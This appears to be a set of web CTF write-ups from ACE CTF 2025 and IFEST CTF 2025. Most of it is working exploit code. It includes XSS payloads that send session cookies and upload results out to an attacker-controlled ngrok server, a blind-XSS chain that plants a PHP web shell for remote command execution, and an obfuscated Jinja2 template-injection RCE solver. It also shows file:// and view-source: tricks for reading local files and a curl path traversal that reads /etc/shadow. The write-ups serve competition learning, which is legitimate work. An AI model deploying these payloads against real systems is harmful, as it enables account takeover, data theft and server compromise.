entry.content:
ShareIT

Step 1: Where is the Flag?

Looking at the provided files, the location of the flag was completely unknown—whether it was stored in a file or a variable, it literally wasn’t there. So I asked the challenge author, and it turned out the flag is located in the root directory (/) with the filename <random_str>.txt.

Step 2: Privillege Escallation to Admin

Register at /api/auth/register

Login at /api/auth/login

Analysis:
In the register function, data from req.body is directly pushed to the users array. As it turns out, there is no proper validation there, so if we send a payload like {" email": "admin"} (notice the leading space in the key), it still gets pushed into the array without further checks.

static async register(req: Request, res: Response) {const { email, password } = req.body;if (!email || !password) {return res.status(400).json({ message: 'Email and password arerequired' });}if (AuthHandler.users.some((u) => u.email === email)) {return res.status(409).json({ message: 'Email already registered'});}AuthHandler.users.push(req.body);return res.status(201).json({ message: 'Registration successful'});}

Moving on to the login function: here, it loops through every user data entry and checks the email and password fields. But uniquely, before checking, all keys are trim()ed. Meaning, if there is a key " email" (with a leading space), it will become "email" when checked.

Because we previously succeeded in inserting the data {" email": "admin"}, during the login process, the " email" key will be trimmed to "email", and its value will be captured as "admin". The system assumes we are logging in as admin and ultimately grants us a JWT token with the admin role.

static async login(req: Request, res: Response) {    const { email, password } = req.body;    const user = [...AuthHandler.users].reverse().find((u) => u.email === email);    if (!user || user.password !== password) {        return res.status(401).json({ message: 'Invalid email or password' });    }        const adminEmails = AuthHandler.admins.map((a) => a.email);    const { password: _, ...userData } = user;        for (const key in userData) {        if (userData.hasOwnProperty(key)) {            const keyClean = key.trim();            if (keyClean.includes('email')) {                const value = userData[key as keyof typeof userData];                if (!value) continue;                if (typeof value === 'boolean') continue;                if (adminEmails.includes(value.trim())) {                    const token = jwt.sign({ email, admin: true }, secret_key, {                        expiresIn: '1h',                    });                    res.setHeader('Authorization', `Bearer ${token}`);                    return res.status(200).json({ user: user, token: token });                }            }        }    }        const token = jwt.sign({ email, admin: false }, secret_key, {        expiresIn: '1h',    });    res.setHeader('Authorization', `Bearer ${token}`);    return res.status(200).json({ user: user, token: token });}

Step 3: File Upload to Stored XSS

The /api/upload endpoint can only be accessed if we have a JWT token with the admin role. Since we already succeeded in obtaining an admin JWT token, we have full access to this feature.

The issue here is that the upload function does not perform any extension validation on the uploaded file. Consequently, we are free to upload any file type, including .html files. If we upload xss.html, for example, the file will be saved directly and made publicly accessible at /uploads/xss.html.

The result? Stored XSS.

static async Png(req: JWTRequest, res: Response) {    if (!req.auth) {        return res.status(401).json({ message: 'Unauthorized' });    }    if (!req.auth.admin) {        return res.status(403).json({ message: 'Forbidden' });    }    if (!req.validatedFiles) {        return res.status(400).json({ status: 'error', message: 'File is required' });    }    const fileName = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);    const fileExtension = req.validatedFiles[0].originalname.split('.').pop();    const fullFileName = fileName + '.' + fileExtension;        fs.writeFileSync('./uploads/' + fullFileName, req.validatedFiles[0].buffer);    return res.status(200).json({ message: fullFileName });}

Step 4: Get debug_mode=true JWT Token via XSS + SSRF

At the /api/auth/init endpoint, we can obtain a JWT token that has debug_mode: true. However, this token is only granted if the entity accessing the endpoint is recognized as a “local user”.

Since we found a stored XSS vulnerability and the bot executes actions as a local user, we can force the bot to access /api/auth/init. As a result, the bot will receive a user cookie containing a JWT token with debug_mode: true. From there, we just need to exfiltrate that cookie via XSS back to our own server.

static async init(req: Request, res: Response) {    let email = 'initdbg';    let dbg = false;    const parsedLocaladdr = req.socket.localAddress?.replace(/::ffff:/, '') || '';    const parsedRemoteaddr = req.socket.remoteAddress?.replace(/::ffff:/, '') || '';        if (!parsedRemoteaddr) {        return res.status(400).json({ message: 'Invalid remote address' });    }        var isLocal = parsedLocaladdr === parsedRemoteaddr || parsedRemoteaddr === '::1' || isPrivateIP(parsedRemoteaddr);        if (req.headers.authorization && isLocal) {        const token = req.headers.authorization.split(' ')[1];        const decoded = jwt.verify(token, secret_key);        if (decoded) {            const user = jwt.decode(token) as User;            dbg = true;            email = user.email;        }    }        console.log(        'debugging mode:', dbg,        'email:', email,        'localAddress:', parsedLocaladdr,        'remoteAddress:', parsedRemoteaddr    );        res.cookie(        'user',        jwt.sign({ email: email, admin: false, debug_mode: dbg }, secret_key, { expiresIn: '1h' })    );    res.status(200).json({ message: 'Auth system initialized' });}

Here is the XSS script payload:

<script>(async () => {    // Trigger the endpoint to set the cookie    await open("/api/auth/init");    // Delay for 2 seconds to ensure processing completes    await new Promise((resolve) => setTimeout(resolve, 2000));    // Exfiltrate the cookie to the attacker's server    await fetch(`${public_url}/getCookie?${document.cookie}`);})();</script>

Why use open("/api/auth/init") instead of a direct fetch("/api/auth/init")?

The server checks the Sec-Fetch-Mode header. If we use fetch(), the browser automatically sets Sec-Fetch-Mode: cors, causing the server to block the request. However, using open() forces the browser to open a new context, changing the header to Sec-Fetch-Mode: navigate. The server considers this valid, allowing us to bypass the protection and successfully obtain the debug_mode: true cookie.

app.use((req, res, next) => {    const secFetchMode = req.get("Sec-Fetch-Mode");    if (secFetchMode && secFetchMode !== "navigate") {        return res            .status(403)            .send("Blocked: Please navigate on your own. This is an API for unit testing.");    }    next();});

Step 5: Local File Read

Access to the /api/runtest endpoint is restricted to admins, and this validation is verified using the JWT token supplied in the Authorization header.

Curiously, this endpoint also performs an additional check for debug_mode. Instead of extracting debug_mode from the Authorization header, it extracts it from the user cookie. If the cookie doesn’t exist, it falls back to the JWT in the header.

This means two distinct JWT sources are processed here:

  1. Authorization Header: Verifies if we possess the admin role.
  2. User Cookie: Verifies if debug_mode is set to true.

As a result, we can supply two different tokens simultaneously: an admin token in the header, and a debug_mode: true token within the cookie. This combination grants us admin status while enabling debug mode at the same time.

app.post("/api/runtest", jwtMiddleware, async (req: JWTRequest, res: Response) => {    if (!req.auth) {        return res.status(401).json({ message: "Unauthorized" });    }    if (!req.auth.admin) {        return res.status(403).json({ message: "Forbidden" });    }        const url = req.body.url as string;    const timeout = (req.body.timeout as number) || 0;        if (timeout > 5000) {        return res.status(400).json({ message: "Timeout is too long" });    }    if (!url) {        return res.status(400).json({ message: "URL is required" });    }    if (url.length > 60) {        console.log("URL is too long");        return res.status(400).json({ message: "URL is too long" });    }        const urlP = new URL(url);    if (!url.includes("http://localhost")) {        return res.status(400).json({ message: "URL must be localhost" });    }        const context = await browserCtx();    await context.setExtraHTTPHeaders({        Authorization: req.headers.authorization || "",    });        const user = jwt.decode(req.cookies.user || req.headers.authorization!.split(" ")[1]) as User;    const page = await context.newPage();        try {        if (!user.debug_mode) {            if (urlP.hostname) {                if (!["localhost", "127.0.0.1"].includes(urlP.hostname)) {                    return res.status(400).json({ message: "URL must be localhost" });                }            }            const response = await page.goto(url, {                waitUntil: "load",                timeout: timeout,            });            if (!response) {                throw new Error("No response received");            }            console.log(await page.content());        }                if (user.debug_mode) {            if (urlP.hostname) {                if (!["localhost", "127.0.0.1"].includes(urlP.hostname)) {                    return res.status(400).json({ message: "URL must be localhost" });                }            }            console.info("Debug mode is enabled, skipping page.goto for URL:", url);            await page.goto(url, {                waitUntil: "load",                timeout: timeout,            });            const content = await page.content();            if (!content) {                throw new Error("No response received from page.goto");            }            console.log(content);            AuthHandler.users.push({                email: user.email,                password: "dbgpass1234",                debug_mode: false,                log: content,            });        }    } catch (error) {        console.error("Error during page navigation:", error);        return res.status(500).json({ message: "Internal Server Error" });    } finally {        await page.waitForTimeout(timeout);        await page.close();        await context.close();    }    res.status(200).json({ message: "unit test success" });});

Armed with both tokens, we can abuse the /api/runtest endpoint to read arbitrary local files from the bot’s system. To do this, we must first bypass the URL validation layers.

The application uses two layers of verification to ensure the URL points to localhost:

if (!url.includes("http://localhost")) {    return res.status(400).json({ message: "URL must be localhost" });}

This block only checks for the literal string "http://localhost" anywhere within the URL structure. We can bypass this check using a URL fragment scheme: file:///etc/passwd#http://localhost.

Next, the second validation layer checks the parsed hostname:

const urlP = new URL(url);if (urlP.hostname) {    if (!["localhost", "127.0.0.1"].includes(urlP.hostname)) {        return res.status(400).json({ message: "URL must be localhost" });    }}

Because we are passing the payload file:///etc/passwd#http://localhost, the urlP.hostname resolves to an empty string (since the file:// scheme does not utilize a traditional hostname component). As a result, this second validation block is skipped entirely.

Consequently, the bot executes:

await page.goto("file:///etc/passwd#http://localhost")

The contents of /etc/passwd will be read by the bot and appended directly to the array:

AuthHandler.users.push({    email: user.email,    password: "dbgpass1234",    debug_mode: false,    log: content, // <- The contents of /etc/passwd are saved here});

We can subsequently review the output logs simply by logging back into our account using our email address and the password dbgpass1234.

Step 6: Directory Listing via View-source Protocol

While we can read local files via the file:// scheme, the actual flag filename is completely randomized. Guessing it blindly would be virtually impossible.

However, research into headless browser file-read vectors revealed an intriguing trick regarding the behavior of the view-source: protocol (reference: Arbitrary File Read Tricks with Headless Browsers).

In headless instances, referencing view-source:file:/// forces the engine to render the directory structure of the filesystem root path (/).

Windows environment behavior example:

By targeting the root directory using the payload view-source:file:///#http://localhost, we can list the directory structure:


The random flag filename is revealed as 9acgk8zwv043cvnhy.txt.

Finally, we read the target file contents by sending the payload view-source:file:///9acgk8zwv043cvnhy.txt#http://localhost:

The flag is successfully retrieved!

import requestsimport stringimport randomfrom flask import Flask, requestimport time# ====== CHANGE ME ======URL = "http://117.53.46.98:3000"public_url = "http://6.tcp.ngrok.io:16734"PORT = 9999# ====== CHANGE ME ======def rand_str(k=8):    return ''.join(random.choices(string.ascii_letters, k=k))app = Flask(__name__)x = requests.Session()DEBUG_MODE_COOKIE = ""def register_admin(email, password):    data = {        "email": email,        " email": "admin",        "password": password,    }    res = x.post(URL + "/api/auth/register", json=data)    print(f"[X] Register account: {res.text}")def login(email, password):    data = {        "email": email,        " email": "admin",        "password": password    }    res = x.post(URL + "/api/auth/login", json=data)    body = res.json()    print(f"[X] Login account: {body}")    return body.get('token')def upload_file(headers):    payload = f'''<script>    (async() => {{        await open('/api/auth/init');        await (new Promise(resolve => setTimeout(resolve, 2000)));        await fetch(`{public_url}/getCookie?${{document.cookie}}`);    }})();    </script>'''        files = {        'files': ('test.html', payload, 'image/png')    }    res = x.post(URL + "/api/upload", files=files, headers=headers)    print(f"[X] File uploaded: {res.text}")    return res.json().get('message')def runtest(url, headers, cookies=None):    if cookies is None:        cookies = {}    data = {        'url': url,        "timeout": 5000    }    res = x.post(URL + "/api/runtest", headers=headers, json=data, cookies=cookies)    print(f"Running test: {res.text}")@app.route('/getCookie')def getCookie():    global DEBUG_MODE_COOKIE    DEBUG_MODE_COOKIE = request.args.get('user')    return "nice!", 200@app.route('/exploit')def exploit():    global DEBUG_MODE_COOKIE    email, password = f"user_{rand_str()}@gmail.com", "password123"        register_admin(email, password)    token = login(email, password)    headers = {        'Authorization': f'Bearer {token}'    }        file = upload_file(headers)    runtest(f'http://localhost:3000/{file}', headers)    time.sleep(5)        # List root directory to find the random flag filename    runtest('view-source:file:///#http://localhost', headers, {'user': DEBUG_MODE_COOKIE})        # Read the specific flag file    runtest('view-source:file:///9acgk8zwv043cvnhy.txt#http://localhost', headers, {'user': DEBUG_MODE_COOKIE})        # Authenticate to retrieve the logs filled by the debug exploit    login(email, "dbgpass1234")    return "done.", 200if __name__ == "__main__":    app.run(host='0.0.0.0', port=PORT, debug=True)

Velixs.com - PCS

Step 1: Finding the Flag Location

We were given a MASSIVE amount of source code…

Essentially, the flag is located in a file with a completely randomized name.

Step 2: Huh? A Bot?? Could it Be XSS??

There is an active bot simulation in this environment, which suggests we need to perform client-side exploitation, such as Cross-Site Scripting (XSS).

In this challenge, the bot acts as an administrator. Its workflow is as follows:

  1. Log in as an admin (username: ilsya).
  2. Visit /admin.
  3. Extract all <a href> elements in the HTML that contain the string /admin.
  4. Systematically visit every discovered /admin/... link.

The bot’s structural implementation looks like this:

async function run() {    const context = await browserCtx();    const visited = new Set<string>();    try {        const page = await context.newPage();        await page.goto(`${process.env.BASE_URL}/login`);        await page.fill('input[name="username"]', "ilsya");        await page.fill('input[name="password"]', process.env.PASS_ADMIN!);        await page.click('button[type="submit"]');        await page.waitForSelector(".toast-ilsya-msg");                await page.goto(`${process.env.BASE_URL}/admin`);        const links = await page.$$eval("a[href]", (as) =>            as                .map((a) => (a as HTMLAnchorElement).href)                .filter((href) => href.includes("/admin"))        );                console.log(`Found ${links.length} /admin links.`);                for (const url of links) {            if (visited.has(url)) continue;            visited.add(url);            try {                console.log(`Visiting: ${url}`);                await page.goto(url, { waitUntil: "networkidle" });                const title = await page.title();                console.log(`  ✔️ ${url} - ${title}`);            } catch (err) {                console.error(`  ❌ Failed to visit ${url}:`, err);            }        }    } catch (error) {        console.error(error);    } finally {        await context.close();    }}

Step 3: Blind XSS

While inspecting the source code inside attachments/velixs-web-ori/app/Http/Controllers/Admin/WAProgrammerController.php, we found an interesting implementation detail:

public function json(Request $request) {    if(!$request->ajax()) return redirect()->route('admin.wagroup.index');        $table = waGroup::all();    return datatables()->of($table)        ->addColumn('whatsapp', function($row) {            return '<div class="d-flex justify-content-start align-items-center user-name">' .                   '<div class="avatar-wrapper"><div class="avatar me-2"><img src="'.$row->_image().'" alt="Avatar" class="rounded-circle"></div></div>' .                   '<div class="d-flex flex-column">' .                   '<a href="'.$row->whatsapp_url.'" class="emp_name text-truncate">'.htmlspecialchars($row->name).'</a>' .                   '<small class="emp_post text-truncate text-muted"></small>' .                   '</div></div>';        });}

Notice this specific line:

<a href="'.$row->whatsapp_url.'"

The value of whatsapp_url is directly concatenated into the raw HTML string without any htmlspecialchars() escaping or filtering. This means if we can control the whatsapp_url value, we can achieve XSS 😎.

We can submit our payload via the public submission form at http://challenge.local:1391/whatsapp-programmer.

The form expects a valid WhatsApp group link format, such as: https://chat.whatsapp.com/HMl4A18fJftJ0NQkJ7Rglx. We can append our injection payload directly to the URL parameters like this:

https://chat.whatsapp.com/HMl4A18fJftJ0NQkJ7Rglx?"><img src=x onerror="fetch(`http://attacker.com`)"

Because the execution occurs strictly within the restricted admin panel interface, we cannot witness the output directly from our unauthenticated session. However, since the bot logs into the admin account and parses /admin, the script will execute inside its browser context.

This represents a classic Blind XSS vulnerability—we plant the payload, and the privileged bot trips the execution hook when reviewing submissions.

After submitting the injection URL, we trigger the bot execution script:

And it works perfectly! Blind XSS confirmed!

Step 4: Blind XSS to PHP File Upload to RCE

Looking closely at attachments\velixs-web-ori\config\file-manager.php, we can see a file manager plugin configuration that restricts file operations to administrative sessions via custom middleware:

<?phpuse Alexusmai\LaravelFileManager\Services\ConfigService\DefaultConfigRepository;use Alexusmai\LaravelFileManager\Services\ACLService\ConfigACLRepository;return [    'configRepository'  => DefaultConfigRepository::class,    'aclRepository'     => ConfigACLRepository::class,    'middleware'        => ['web', 'isadmin'],    'routePrefix'       => 'files/ilsya',    'diskList'          => ['public'],];

According to attachments\velixs-web-ori\vendor\alexusmai\laravel-file-manager\src\routes.php, the upload endpoint maps directly to /files/ilsya/upload:

$config = resolve(ConfigRepository::class);// App middleware list$middleware = $config->getMiddleware();Route::group([    'middleware' => $middleware,    'prefix'     => $config->getRoutePrefix(),    'namespace'  => 'Alexusmai\LaravelFileManager\Controllers',], function () {    Route::post('upload', [FileManagerController::class, 'upload'])        ->name('fm.upload');});

The processing logic inside attachments\velixs-web-ori\vendor\alexusmai\laravel-file-manager\src\Controllers\FileManagerController.php requires specific parameter structures (disk, path, and the raw files[] payload):

public function upload(RequestValidator $request): JsonResponse{    event(new FilesUploading($request));    $uploadResponse = $this->fm->upload(        $request->input('disk'),        $request->input('path'),        $request->file('files'),        $request->input('overwrite')    );    event(new FilesUploaded($request));    return response()->json($uploadResponse);}

Since only verified administrative sessions can communicate with this endpoint, we can leverage our Blind XSS payload to force the admin bot to send the multipart file upload request on our behalf.

Here is the JavaScript XSS payload to perform the file creation:

(async () => {    try {        const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content || "";        const phpCode = `<?php system($_GET['cmd']); ?>`;        const file = new File([phpCode], "shell.php", {            type: "application/x-php",        });        const formData = new FormData();        formData.append("disk", "public");        formData.append("path", "/");        formData.append("files[]", file);        await fetch("/files/ilsya/upload", {            method: "POST",            headers: {                "X-CSRF-TOKEN": csrfToken,                Accept: "application/json",            },            body: formData,            credentials: "include",        });    } catch (err) {        console.error("Upload error:", err);    }})();

When the bot triggers the XSS payload, the PHP web shell is uploaded directly to the application’s storage path.

From here, we simply access our web shell at http://challenge.local:1391/storage/shell.php?cmd=ls to achieve Remote Code Execution (RCE)!

Below is the structured Python script utilizing Flask and PyNgrok to host the malicious JavaScript stage payload and orchestrate the exploit:

import requestsimport stringimport randomimport timefrom flask import Flask, requestfrom pyngrok import ngrok# === CONFIGURATION ===XSS_BOT_URL = "http://bot.local:1987"CHALL_URL = "http://challenge.local:1391"PORT = 9999# =====================# Establish ngrok tunnel connectionpublic_url = "http://" + ngrok.connect(addr=PORT, proto="tcp").public_url[5:]print(f"[+] Tunnel established: {public_url}")x = requests.Session()app = Flask(__name__)# Malicious payload executed by the administrative botjavascript = f"""(async () => {{    try {{        const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content || '';        const phpCode = ``;        const file = new File([phpCode], "shell.php", {{ type: "application/x-php" }});        const formData = new FormData();        formData.append("disk", "public");        formData.append("path", "/");        formData.append("files[]", file);                const uploadRes = await fetch("/files/ilsya/upload", {{            method: "POST",            headers: {{                "X-CSRF-TOKEN": csrfToken,                "Accept": "application/json"            }},            body: formData,            credentials: "include"        }});                const resp = await uploadRes.json();                // Exfiltrate response metadata back to our server        await fetch('{public_url}/extract', {{            method: 'POST',            headers: {{                'Content-Type': 'application/x-www-form-urlencoded'            }},            body: `data=${{encodeURIComponent(JSON.stringify(resp))}}`        }});    } catch (e) {{        console.error(e);    }}}})();"""def trigger_xss():    print("[*] Triggering bot visitor...")    x.get(XSS_BOT_URL)    res = x.post(XSS_BOT_URL + "/run")    return res.text@app.route("/script.js")def script():    return javascript, 200, {"Content-Type": "application/javascript"}@app.route("/extract", methods=['POST', 'GET'])def extract():    print(f"[+] Received exfiltrated data: {request.form}")    return "done", 200@app.route('/exploit')def exploit():    return trigger_xss(), 200if __name__ == "__main__":    payload = f"""https://chat.whatsapp.com/GK80vSkE3JtKehkUGa36TD?"><script src='{public_url}/script.js'></script>"""    print(f"\n[!] Target Payload:\n{payload}\n")    print(f"[1] Submit the payload above to: {CHALL_URL}/whatsapp-programmer")    print(f"[2] Navigate to http://localhost:{PORT}/exploit to trigger the XSS bot execution framework")    print(f"[3] Once triggered, access your shell at: {CHALL_URL}/storage/shell.php?cmd=cat%20../../../flagNyaHarusPakeRCE.txt\n")        app.run(host='0.0.0.0', port=PORT)
entry.summary: ShareIT
entry.title: ACE CTF 2025 Writeup

entry.content:
Qualification

Web V1

The Python code accepts user input through multiple parameters and creates a new user account based on those parameters. The User class contains an is_admin attribute. By simply adding the parameter is_admin=1, we can register an account with administrator privileges.

Register a new account and add the parameter is_admin=1.

The /admin/fetch endpoint is vulnerable to SSRF because its whitelist validation is insecure. The application only checks whether the string daffainfo.com exists anywhere in the submitted URL. We can abuse this by placing daffainfo.com inside the query string, allowing a URL like http://127.0.0.1:1337/internal?daffainfo.com to bypass the validation and access the internal service.

We can simply send a request to the /admin/fetch endpoint using the following URL parameter:

http://127.0.0.1:1337/internal?daffainfo.com

Bypass

The title parameter is first checked against a blacklist. If it passes, it is passed directly into the render_template_string() function.

One common SSTI proof of concept is {{7*7}}, which gets evaluated as 49. However, the application blocks both {{ and }}.

Fortunately, Jinja2 provides another syntax that works just as well:

{% if 7*7==49 %}49{% endif %}

Now the goal is to bypass the blacklist and achieve RCE. I found a useful resource for building Jinja2 SSTI payloads:

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

Next, I wrote the following solver:

import requestsfrom bs4 import BeautifulSoupfrom urllib.parse import quotedef solver(url):    # Cat flag and save it to static/testing12312    payload = r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('cat reward/fl\x2a >> static/testing12312') %} a {%endif%}"""    trigger_ssti(url, payload)    # Read flag    res = requests.get(f"{url}/static/testing12312")    print(res.text)    # Delete the file to avoid unintended access by other participants    payload = r"""{% if request|attr('\x61pplication')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fi\x6dport\x5f\x5f')('o\x73')|attr('popen')('rm static/testing12312') %} a {%endif%}"""    trigger_ssti(url, payload)def trigger_ssti(url, payload):    url = f"{url}/?title={quote(payload)}"    res = requests.get(url)    res = BeautifulSoup(res.text,'html.parser').find('h1', class_='display-4 fst-italic')    print(res)if __name__ == "__main__":    url = "http://103.163.139.198:8888"    solver(url)

Orbiter

The challenge exposed a phpinfo.php file that leaked the credentials required to log in. The password turned out to be the first part of the flag.

After logging in, I found a JWT cookie containing the second part of the flag. Finally, one of the authenticated endpoints was vulnerable to command injection, allowing RCE and revealing the third part of the flag.

First, I performed directory fuzzing and discovered /phpinfo.php.

The page exposed the login credentials as well as the first part of the flag.

Username: Armstrong

Password: 345Y_P34SY

Flag Part 1: 345Y_P34SY

The JWT cookie contained the second part of the flag.

Flag Part 2: _L3M0N_

The authenticated endpoint was vulnerable to command injection. Reading true_flag.txt revealed the final part of the flag.

Flag Part 3: 5QU332Y

Final flag:

IFEST13{345Y_P34SY_L3M0N_5QU332Y!!!}

Final

Web V2

The code below is vulnerable because of User(**data). Since user-controlled parameters are unpacked directly into the constructor, an attacker can provide is_admin=1 and register as an administrator.

Successfully registered as an admin.

The next step was to access /admin/fetch and exploit the SSRF vulnerability. However, the Nginx configuration blocked requests to that endpoint.

Based on the following research:

https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass

the Nginx configuration is vulnerable because the protection rules can be bypassed by appending certain special characters to the request.

Since the server runs Nginx 1.22.0 with a Flask backend, the bypass characters are \x85 or \xA0.

I simply intercepted the request in Burp Suite and inserted \x85 after /admin/fetch.

This successfully bypassed the Nginx rule.

When attempting to perform SSRF against /internal, another protection was in place. The supplied URL was parsed with urlparse(), and the hostname was validated.

This validation can be bypassed by appending \@daffainfo.com. The urlparse() function interprets daffainfo.com as the hostname.

However, the backend later passes the URL to requests.get(), which treats \@daffainfo.com as part of the URL path instead.

To remove the unwanted /%5C@daffainfo.com path segment, I simply used path traversal.

The exploit worked, and I solved the challenge 😀

Flag:

IFEST13{a0526f70f53e2aa1d395ac02b7653498}

PixelPlaza2

The staticHandler function is vulnerable to path traversal.

Why does this happen?

Normally, Go automatically normalizes URL paths. However, when the HTTP method is CONNECT, Go skips the normalization step, making path traversal possible.

Using the following command:

curl "http://103.163.139.198:8888/../../../etc/shadow" -X CONNECT --path-as-is

I was able to read the contents of /etc/shadow.

While browsing /about.html, I noticed a link pointing to /docs/text, but the file didn’t exist.

After some investigation, I found that the docs directory was actually located one level above the current directory.

Using path traversal again, I retrieved the flag with:

curl "http://103.163.139.198:8888/../docs/text" -X CONNECT --path-as-is

Flag:

IFEST13{g0L4nG_5UpP0rt5_p4th_Tr4V3rs4L_w1tH_CONNECT}
entry.title: IFEST CTF 2025 Writeup
